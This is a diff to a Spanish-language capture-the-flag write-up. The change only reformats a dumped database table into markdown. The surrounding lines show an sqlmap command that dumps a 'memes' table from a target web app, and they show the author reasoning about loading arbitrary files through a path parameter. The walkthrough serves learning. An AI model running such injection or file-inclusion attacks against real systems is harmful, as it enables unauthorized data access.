@@ -20,15 +20,13 @@ sqlmap -u "http://143.0.100.198:5010/meme?id=1" -D memes_db -T memes --dump
 
 Ahora entendia porque no podia ver la imagen con `id=5`, justamente, su filename no tenia sentido
 
-+----+----------------+--------+-------------------+
-| id | title          | parent | filename          |
-+----+----------------+--------+-------------------+
+| id  | title  | parent  | filename  |
+|---|---|---|---|
 | 1  | Gondor Captain | 1      | files/boromir.jpg |
 | 2  | GranMa         | 1      | files/cookies.jpg |
 | 3  | You            | 1      | files/hacker.jpg  |
 | 4  | Not too fine   | 1      | files/fine.png    |
 | 5  | Diegote        | 1      | klpsrmfazznufesg  |
-+----+----------------+--------+-------------------+
 
 Ahi tuve otra idea mas. Me imagine que lo que hacia la url, era obtener el path del archivo a mostrar. Luego, yo podria supuestamente cargar cualquier archivo si proporcionaba bien el path.
 
